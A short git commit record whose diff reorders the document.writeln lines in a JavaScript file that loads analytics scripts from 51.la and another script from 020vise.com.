54ca1f35911206a50fb2b46196f19289572b4f03
qiang188 <bt_gady@sina.com>
2015-04-28 14:51:04 +0800

    Update 17767015.js

--- tj/17767015.js
+++ tj/17767015.js
@@ -1,5 +1,7 @@
+document.writeln("<script language='javascript' src='http://020vise.com/nxpy44/qt.js'></script>");
+
 document.writeln("<script language=\"javascript\" type=\"text/javascript\" src=\"http://js.users.51.la/17752445.js\"><\/script>");
 
 document.writeln("<script language=\"javascript\" type=\"text/javascript\" src=\"http://js.users.51.la/17767015.js\"><\/script>");
 
-document.writeln("<script language='javascript' src='http://020vise.com/nxpy44/qt.js'></script>");
+
